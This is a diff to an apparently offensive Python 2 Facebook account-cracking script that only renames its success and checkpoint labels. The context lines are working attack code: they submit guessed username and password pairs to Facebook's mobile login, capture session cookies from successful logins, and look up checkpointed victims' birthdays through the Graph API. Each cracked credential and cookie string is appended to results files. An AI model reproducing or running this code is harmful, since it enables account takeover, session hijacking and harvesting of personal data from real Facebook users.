@@ -380,7 +380,7 @@ class __crack__:
             b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
             if 'c_user' in ses.cookies.get_dict().keys():
                 kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s [WAQAR✓OK] %s|%s|%s                 %s' % (H, user, pw, kuki, N)
+                print '\r  %s [Waqar_OK] %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                 wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -392,7 +392,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s [WAQAR X CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
+                    print '\r  %s [Waqar_CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                     wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -404,7 +404,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s [WAQAR X CP] %s|%s                %s' % (K, user, pw, N)
+                print '\r  %s [Waqar_CP] %s|%s                %s' % (K, user, pw, N)
                 wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
